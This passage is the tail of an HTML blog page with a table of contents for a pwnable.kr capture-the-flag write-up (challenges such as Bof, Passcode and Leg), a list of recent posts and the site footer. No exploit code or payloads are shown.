class="toc-text">Description</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Source-1"><span class="toc-number">2.2.</span> <span class="toc-text">Source</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution-1"><span class="toc-number">2.3.</span> <span class="toc-text">Solution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload-1"><span class="toc-number">2.4.</span> <span class="toc-text">Payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bof"><span class="toc-number">3.</span> <span class="toc-text">Bof</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Description-2"><span class="toc-number">3.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Source-2"><span class="toc-number">3.2.</span> <span class="toc-text">Source</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution-2"><span class="toc-number">3.3.</span> <span class="toc-text">Solution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload-2"><span class="toc-number">3.4.</span> <span class="toc-text">Payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Passcode"><span class="toc-number">4.</span> <span class="toc-text">Passcode</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Description-3"><span class="toc-number">4.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Source-3"><span class="toc-number">4.2.</span> <span class="toc-text">Source</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Checksec"><span class="toc-number">4.2.1.</span> <span class="toc-text">Checksec</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution-3"><span class="toc-number">4.3.</span> <span class="toc-text">Solution</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-4"><span class="toc-number">4.3.1.</span> <span class="toc-text">Solution</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Random"><span class="toc-number">5.</span> <span class="toc-text">Random</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Description-4"><span class="toc-number">5.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Source-4"><span class="toc-number">5.2.</span> <span class="toc-text">Source</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution-5"><span class="toc-number">5.3.</span> <span class="toc-text">Solution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload-3"><span class="toc-number">5.4.</span> <span class="toc-text">Payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Input2"><span class="toc-number">6.</span> <span class="toc-text">Input2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Description-5"><span class="toc-number">6.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Source-5"><span class="toc-number">6.2.</span> <span class="toc-text">Source</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution-6"><span class="toc-number">6.3.</span> <span class="toc-text">Solution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload-4"><span class="toc-number">6.4.</span> <span class="toc-text">Payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Leg"><span class="toc-number">7.</span> <span class="toc-text">Leg</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Description-6"><span class="toc-number">7.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Source-6"><span class="toc-number">7.2.</span> <span class="toc-text">Source</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#leg-c"><span class="toc-number">7.2.1.</span> <span class="toc-text">leg.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#leg-asm"><span class="toc-number">7.2.2.</span> <span class="toc-text">leg.asm</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution-7"><span class="toc-number">7.3.</span> <span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mistake"><span class="toc-number">8.</span> <span class="toc-text">Mistake</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Description-7"><span class="toc-number">8.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Source-7"><span class="toc-number">8.2.</span> <span class="toc-text">Source</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution-8"><span class="toc-number">8.3.</span> <span class="toc-text">Solution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload-5"><span class="toc-number">8.4.</span> <span class="toc-text">Payload</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/02/26/PWNABLE-KR-Phan-2/" title="PWNABLE.KR - Phần 2"><img src="/img/post/writeup/pwnable-kr/thumbnail.png" onerror="this.onerror=null;this.src='/img/error/404.jpg'" alt="PWNABLE.KR - Phần 2"/></a><div class="content"><a class="title" href="/2026/02/26/PWNABLE-KR-Phan-2/" title="PWNABLE.KR - Phần 2">PWNABLE.KR - Phần 2</a><time datetime="2026-02-26T14:38:06.000Z" title="Created 2026-02-26 21:38:06">2026-02-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/02/PWNABLE-KR-Phan-1/" title="PWNABLE.KR - Phần 1"><img src="/img/post/writeup/pwnable-kr/thumbnail.png" onerror="this.onerror=null;this.src='/img/error/404.jpg'" alt="PWNABLE.KR - Phần 1"/></a><div class="content"><a class="title" href="/2026/02/02/PWNABLE-KR-Phan-1/" title="PWNABLE.KR - Phần 1">PWNABLE.KR - Phần 1</a><time datetime="2026-02-02T14:41:01.000Z" title="Created 2026-02-02 21:41:01">2026-02-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/16/How_different_between%20Pointer_and_Array_from_Assembly_Perspective/" title="[Dummy] - How different between Pointer and Array from Assembly Perspective ? "><img src="/img/post/dummy/different-between-Pointer-and-Array/thumbnail.png" onerror="this.onerror=null;this.src='/img/error/404.jpg'" alt="[Dummy] - How different between Pointer and Array from Assembly Perspective ? "/></a><div class="content"><a class="title" href="/2025/08/16/How_different_between%20Pointer_and_Array_from_Assembly_Perspective/" title="[Dummy] - How different between Pointer and Array from Assembly Perspective ? ">[Dummy] - How different between Pointer and Array from Assembly Perspective ? </a><time datetime="2025-08-16T17:14:35.000Z" title="Created 2025-08-17 00:14:35">2025-08-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/16/picoCTF_medium(1)/" title="[Writeup] - Solving Pwn on PicoCTF"><img src="/img/post/writeup/picoctf/thumbnail.png" onerror="this.onerror=null;this.src='/img/error/404.jpg'" alt="[Writeup] - Solving Pwn on PicoCTF"/></a><div class="content"><a class="title" href="/2025/08/16/picoCTF_medium(1)/" title="[Writeup] - Solving Pwn on PicoCTF">[Writeup] - Solving Pwn on PicoCTF</a><time datetime="2025-08-16T17:14:35.000Z" title="Created 2025-08-17 00:14:35">2025-08-17</time></div></div></div></div></div></div></main><footer id="footer" style="background: black;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By vuk3r</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4-b1</a></span></div><div class="footer_custom_text">Hope you like my profile</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>